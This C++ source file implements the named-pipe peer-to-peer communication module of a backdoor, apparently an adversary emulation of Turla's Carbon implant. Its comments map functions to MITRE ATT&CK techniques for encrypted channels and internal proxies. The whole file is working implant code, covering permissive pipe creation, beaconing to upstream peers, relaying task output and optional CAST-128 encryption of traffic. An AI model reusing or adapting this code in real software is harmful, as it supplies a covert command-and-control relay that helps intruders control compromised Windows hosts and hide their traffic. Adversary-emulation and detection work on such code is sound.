/*
 *  About:
 *      Handles peer-to-peer communication over named pipes. Traffic can be encryped with CAST-128 if specified.
 *  MITRE ATT&CK Techniques:
 *      T1573.001: Encrypted Channel: Symmetric Cryptography
 *      T1090.001: Proxy: Internal Proxy
 *  CTI:
 *      https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *      https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 */

#include "NamedPipeP2p.hpp"
#include "Logging.hpp"
#include "Util.hpp"
#include <string>

namespace comms_pipe {

// Reference: https://learn.microsoft.com/en-us/windows/win32/secbp/creating-a-dacl
DWORD CreateNamedPipeSecurityAttr(WinApiWrapperInterface* api_wrapper, SECURITY_ATTRIBUTES* sa) {
    sa->nLength = sizeof(SECURITY_ATTRIBUTES);
    sa->bInheritHandle = FALSE;

    std::wstring dacl_str = std::wstring(L"D:") + // Discretionary ACL
        L"(D;OICI;GA;;;BG)" +      // Deny access to built-in guests
        L"(D;OICI;GA;;;AN)" +      // Deny access to anonymous logon
        L"(A;OICI;GRGWGX;;;AU)" +  // Allow RWX to authenticated users
        L"(A;OICI;GA;;;BA)";       // Allow full control to administrators

    BOOL result = api_wrapper->ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        dacl_str.c_str(),
        SDDL_REVISION_1,
        &(sa->lpSecurityDescriptor),
        NULL
    );
    if (!result) {
        return api_wrapper->GetLastErrorWrapper();
    }
    return ERROR_SUCCESS;
}

HANDLE CreatePermissivePipe(WinApiWrapperInterface* api_wrapper, std::string pipe_name, DWORD* error_code) {
    static HANDLE h_pipe;

    // Create client-side pipe
    SECURITY_ATTRIBUTES pipe_sa;
    *error_code = CreateNamedPipeSecurityAttr(api_wrapper, &pipe_sa);
    if (*error_code != ERROR_SUCCESS) {
        logging::LogMessage(
            api_wrapper,
            LOG_P2P_HANDLER, 
            LOG_LEVEL_ERROR, 
            "Failed to set security attribute struct for client pipe. Error code: " + std::to_string(*error_code)
        );
        return INVALID_HANDLE_VALUE;
    }
    h_pipe = api_wrapper->CreateNamedPipeWrapper(
        util::ConvertStringToWstring(pipe_name).c_str(),
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_IN_BUFFER,
        PIPE_OUT_BUFFER,
        0,
        &pipe_sa
    );
    if (h_pipe == INVALID_HANDLE_VALUE) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_P2P_HANDLER, 
            LOG_LEVEL_ERROR, 
            "Failed to create pipe " + pipe_name + ". Error code: " + std::to_string(*error_code)
        );
        return INVALID_HANDLE_VALUE;
    }
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Created client pipe " + pipe_name);
    if (api_wrapper->LocalFreeWrapper(pipe_sa.lpSecurityDescriptor) != NULL) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        api_wrapper->CloseHandleWrapper(h_pipe);
        logging::LogMessage(
            api_wrapper,
            LOG_P2P_HANDLER, 
            LOG_LEVEL_ERROR, 
            "Failed to free memory for pipe security descriptor. Error code: " + std::to_string(*error_code)
        );
        return INVALID_HANDLE_VALUE;
    }
    *error_code = ERROR_SUCCESS;
    return h_pipe;
}

// Connect to given pipe to write to it. Will block if pipe is busy until successful connection
HANDLE ConnectToPipe(
    WinApiWrapperInterface* api_wrapper,
    LPCWSTR pipe_name,
    DWORD* error_code
) {
    static HANDLE h_pipe;
    std::string pipe_name_narrow = util::ConvertWstringToString(pipe_name);
    logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_DEBUG, "Attempting to connect to named pipe " + pipe_name_narrow);
    while (true) {
        h_pipe = api_wrapper->CreateFileWrapper(
            pipe_name,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (h_pipe != INVALID_HANDLE_VALUE) {
            logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_DEBUG, "Accessed named pipe.");
            *error_code = ERROR_SUCCESS;
            break;
        }

        *error_code = api_wrapper->GetLastErrorWrapper();
        if (*error_code == ERROR_PIPE_BUSY) {
            logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, "Pipe busy. Retrying.");
        } else if (*error_code == ERROR_FILE_NOT_FOUND) {
            logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, "Pipe not found.");
            return INVALID_HANDLE_VALUE;
        } else {
            logging::LogMessage(
                api_wrapper, 
                LOG_NAMED_PIPE, 
                LOG_LEVEL_ERROR, 
                "Other error when connecting to pipe. Error code: " + std::to_string(*error_code)
            );
            return INVALID_HANDLE_VALUE;
        }
        api_wrapper->SleepWrapper(PIPE_CONNECT_SLEEP_MS);
    }
    return h_pipe;
}

/*
 * GetPipeMsg
 *      About:
 *          Reads in a clientpeer-to-peer message from a given pipe. Will use CAST-128 encryption if specified.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
DWORD GetPipeMsg(WinApiWrapperInterface* api_wrapper, HANDLE h_pipe, PipeMessage* msg_buf, bool use_encryption) {
    std::vector<char> v_client_msg;
    BOOL result;
    std::vector<char> response_buffer = std::vector<char>(PIPE_OUT_BUFFER);
    DWORD num_bytes_read = 0;
    DWORD total_bytes_read = 0;
    DWORD error = ERROR_SUCCESS;
    while(TRUE) {
        result = api_wrapper->ReadFileWrapper(
            h_pipe,
            &response_buffer[0],
            PIPE_OUT_BUFFER,
            &num_bytes_read,
            NULL
        );

        total_bytes_read += num_bytes_read;
        if (num_bytes_read > 0) {
            v_client_msg.insert(v_client_msg.end(), response_buffer.begin(), response_buffer.begin() + num_bytes_read);
        }
        if (!result) {
            error = api_wrapper->GetLastErrorWrapper();
            if (error == ERROR_BROKEN_PIPE) {
                // End of pipe. Normal flow.
                error = ERROR_SUCCESS;
                break;
            } else if (error != ERROR_MORE_DATA) {
                logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, "Failed to read data from pipe. Error code: " + std::to_string(error));
                return error;
            }
        }
    }
    logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_DEBUG, "Read a total of " + std::to_string(total_bytes_read) + " bytes from pipe.");

    // Decrypt
    std::vector<char> decrypted;
    if (use_encryption && cast128_enc::kCast128Key.size() > 0) {
        try {
            decrypted = cast128_enc::Cast128Decrypt(v_client_msg, cast128_enc::kCast128Key);
        } catch (const std::exception& ex) {
            logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, "cast128 encryption exception: " + std::string(ex.what()));
            return FAIL_ENCRYPTION_EXCEPTION;
        }
    } else {
        decrypted = v_client_msg;
    }

    size_t offset = 0;
    msg_buf->message_type = *((int32_t*)(&decrypted[offset]));
    offset += sizeof(int32_t);
    msg_buf->client_id_len = *((int32_t*)(&decrypted[offset]));
    offset += sizeof(int32_t);
    msg_buf->client_id = std::string(decrypted.cbegin() + offset, decrypted.cbegin() + offset + msg_buf->client_id_len);
    offset += msg_buf->client_id_len;
    msg_buf->response_pipe_path_len = *((int32_t*)(&decrypted[offset]));
    offset += sizeof(int32_t);
    msg_buf->response_pipe_path = std::string(decrypted.cbegin() + offset, decrypted.cbegin() + offset + msg_buf->response_pipe_path_len);
    offset += msg_buf->response_pipe_path_len;
    msg_buf->data = std::vector<char>(decrypted.begin() + offset, decrypted.end());
    return ERROR_SUCCESS;
}

/*
 * SendPipeMsg
 *      About:
 *          Sends clientpeer-to-peer message to a given pipe. Will use CAST-128 encryption if specified.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
DWORD SendPipeMsg(WinApiWrapperInterface* api_wrapper, HANDLE h_pipe, PipeMessage* msg_buf, bool use_encryption) {
    size_t payload_size = msg_buf->data.size();
    size_t msg_size = sizeof(int32_t) + // msg type length
        sizeof(int32_t) + msg_buf->client_id_len + // client id length + client id
        sizeof(int32_t) + msg_buf->response_pipe_path_len + // response pipe path length + response pipe path
        payload_size;
    std::vector<char> buffer;
    buffer.reserve(msg_size);

    // Populate buffer
    // msg type is first 4 bytes
    buffer.insert(buffer.begin(), (char*)(&(msg_buf->message_type)), (char*)(&(msg_buf->message_type)) + sizeof(int32_t));

    // add client ID length
    size_t offset = sizeof(int32_t);
    buffer.insert(buffer.begin() + offset, (char*)(&(msg_buf->client_id_len)), (char*)(&(msg_buf->client_id_len)) + sizeof(int32_t));

    // add client ID
    offset += sizeof(int32_t);
    if (msg_buf->client_id_len > 0) {
        buffer.insert(buffer.begin() + offset, msg_buf->client_id.begin(), msg_buf->client_id.end());
    }

    // add response pipe path length
    offset += msg_buf->client_id_len;
    buffer.insert(buffer.begin() + offset, (char*)(&(msg_buf->response_pipe_path_len)), (char*)(&(msg_buf->response_pipe_path_len)) + sizeof(int32_t));

    // add response pipe path
    offset += sizeof(int32_t);
    if (msg_buf->response_pipe_path_len > 0) {
        buffer.insert(buffer.begin() + offset, msg_buf->response_pipe_path.begin(), msg_buf->response_pipe_path.end());
    }

    // add payload
    offset += msg_buf->response_pipe_path_len;
    if (payload_size > 0) {
        buffer.insert(buffer.begin() + offset, &(msg_buf->data[0]), &(msg_buf->data[0]) + payload_size);
    }

    // Encrypt
    std::vector<char> encrypted;
    if (use_encryption && cast128_enc::kCast128Key.size() > 0) {
        try {
            encrypted = cast128_enc::Cast128Encrypt(buffer, cast128_enc::kCast128Key);
        } catch (const std::exception& ex) {
            logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, "cast128 encryption exception: " + std::string(ex.what()));
            return FAIL_ENCRYPTION_EXCEPTION;
        }
    } else {
        encrypted = buffer;
    }

    DWORD remaining_bytes = (DWORD)encrypted.size();
    DWORD bytes_written;
    DWORD error;
    DWORD total_bytes_written = 0;

    char* p_seek_buffer = &encrypted[0];
    while (remaining_bytes > 0) {
        if (!api_wrapper->WriteFileWrapper(h_pipe, p_seek_buffer, (remaining_bytes < PIPE_IN_BUFFER ? remaining_bytes : PIPE_IN_BUFFER), &bytes_written, NULL)) {
            error = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, "Failed to write to pipe. Error code: " + std::to_string(error));
            return error;
        }
        p_seek_buffer += bytes_written;
        total_bytes_written += bytes_written;
        remaining_bytes -= bytes_written;
    }
    logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_DEBUG, "Wrote a total of " + std::to_string(total_bytes_written) + " bytes to pipe.");
    if (!api_wrapper->FlushFileBuffersWrapper(h_pipe)) {
        error = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, "Failed to flush pipe buffer. Error code: " + std::to_string(error));
        return error;
    }
    return ERROR_SUCCESS;
}

/*
 * SendBeaconRequest
 *      About:
 *          Sends a beacon request to the upstream peer. Will use CAST-128 encryption if specified.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
DWORD SendBeaconRequest(WinApiWrapperInterface* api_wrapper, LPCWSTR dest_pipe, std::string client_id, std::string response_pipe_path, bool use_encryption) {
    DWORD result;
    HANDLE h_pipe = ConnectToPipe(api_wrapper, dest_pipe, &result);
    if (result != ERROR_SUCCESS || h_pipe == INVALID_HANDLE_VALUE) {
        std::string dest_pipe_narrow = util::ConvertWstringToString(dest_pipe);
        std::string log_msg = "Could not connect to pipe " + dest_pipe_narrow + " to send beacon request. Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, log_msg);
        return result;
    }
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_BEACON;
    msg.client_id_len = (int32_t)client_id.length();
    msg.client_id = std::string(client_id);
    msg.response_pipe_path_len = (int32_t)response_pipe_path.length();
    msg.response_pipe_path = std::string(response_pipe_path);
    msg.data = std::vector<char>(); // no payload needed for beacon
    logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_DEBUG, "Beacon client id: " + msg.client_id);
    logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_DEBUG, "Beacon response pipe: " + msg.response_pipe_path);
    result = SendPipeMsg(api_wrapper, h_pipe, &msg, use_encryption);
    api_wrapper->CloseHandleWrapper(h_pipe);
    return result;
}

/*
 * SendBeaconResp
 *      About:
 *          Sends a beacon response to downstream peer client. Will use CAST-128 encryption if specified.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
DWORD SendBeaconResp(WinApiWrapperInterface* api_wrapper, LPCWSTR dest_pipe, std::vector<char> resp_data, bool use_encryption) {
    DWORD result;
    HANDLE h_pipe = ConnectToPipe(api_wrapper, dest_pipe, &result);
    if (result != ERROR_SUCCESS || h_pipe == INVALID_HANDLE_VALUE) {
        std::string dest_pipe_narrow = util::ConvertWstringToString(dest_pipe);
        std::string log_msg = "Could not connect to pipe " + dest_pipe_narrow + " to send beacon response. Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, log_msg);
        return result;
    }
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_BEACON_RESP;
    msg.client_id_len = 0;
    msg.client_id = "";
    msg.response_pipe_path_len = 0;
    msg.response_pipe_path = "";
    msg.data = std::vector<char>(resp_data);
    result = SendPipeMsg(api_wrapper, h_pipe, &msg, use_encryption); 
    api_wrapper->CloseHandleWrapper(h_pipe);
    return result;
}

/*
 * SendErrorResp
 *      About:
 *          Sends a beacon error response to downstream peer client. Will use CAST-128 encryption if specified.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
DWORD SendErrorResp(WinApiWrapperInterface* api_wrapper, LPCWSTR dest_pipe, std::string error_msg, bool use_encryption) {
    DWORD result;
    HANDLE h_pipe = ConnectToPipe(api_wrapper, dest_pipe, &result);
    if (result != ERROR_SUCCESS || h_pipe == INVALID_HANDLE_VALUE) {
        std::string dest_pipe_narrow = util::ConvertWstringToString(dest_pipe);
        std::string log_msg = "Could not connect to pipe " + dest_pipe_narrow + " to send error response. Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, log_msg);
        return result;
    }
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_ERROR_RESP;
    msg.client_id_len = 0;
    msg.client_id = "";
    msg.response_pipe_path_len = 0;
    msg.response_pipe_path = "";
    const char* payload = error_msg.c_str();
    msg.data = std::vector<char>(payload, payload + error_msg.length());
    result = SendPipeMsg(api_wrapper, h_pipe, &msg, use_encryption); 
    api_wrapper->CloseHandleWrapper(h_pipe);
    return result;
}

/*
 * SendTaskOutput
 *      About:
 *          Sends task output to upstream peer. Will use CAST-128 encryption if specified.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
DWORD SendTaskOutput(
    WinApiWrapperInterface* api_wrapper, 
    LPCWSTR dest_pipe, 
    std::string client_id, 
    std::string response_pipe_path, 
    std::vector<char> output, 
    bool use_encryption
) {
    DWORD result;
    HANDLE h_pipe = ConnectToPipe(api_wrapper, dest_pipe, &result);
    if (result != ERROR_SUCCESS || h_pipe == INVALID_HANDLE_VALUE) {
        std::string dest_pipe_narrow = util::ConvertWstringToString(dest_pipe);
        std::string log_msg = "Could not connect to pipe " + dest_pipe_narrow + " to send task output. Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, log_msg);
        return result;
    }
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_TASK_OUTPUT;
    msg.client_id_len = (int32_t)client_id.length();
    msg.client_id = std::string(client_id);
    msg.response_pipe_path_len = (int32_t)response_pipe_path.length();
    msg.response_pipe_path = std::string(response_pipe_path);
    msg.data = std::vector<char>(output);
    result = SendPipeMsg(api_wrapper, h_pipe, &msg, use_encryption); 
    api_wrapper->CloseHandleWrapper(h_pipe);
    return result;
}

/*
 * SendTaskOutputResp
 *      About:
 *          Sends task output response peer client. Will use CAST-128 encryption if specified.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise some error code.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
DWORD SendTaskOutputResp(WinApiWrapperInterface* api_wrapper, LPCWSTR dest_pipe, std::vector<char> resp_data, bool use_encryption) {
    DWORD result;
    HANDLE h_pipe = ConnectToPipe(api_wrapper, dest_pipe, &result);
    if (result != ERROR_SUCCESS || h_pipe == INVALID_HANDLE_VALUE) {
        std::string dest_pipe_narrow = util::ConvertWstringToString(dest_pipe);
        std::string log_msg = "Could not connect to pipe " + dest_pipe_narrow + " to send task response. Error code: " + std::to_string(result);
        logging::LogMessage(api_wrapper, LOG_NAMED_PIPE, LOG_LEVEL_ERROR, log_msg);
        return result;
    }
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_TASK_OUTPUT_RESP;
    msg.client_id_len = 0;
    msg.client_id = "";
    msg.response_pipe_path_len = 0;
    msg.response_pipe_path = "";
    msg.data = std::vector<char>(resp_data);
    result = SendPipeMsg(api_wrapper, h_pipe, &msg, use_encryption); 
    api_wrapper->CloseHandleWrapper(h_pipe);
    return result;
}

} // namespace comms_pipe
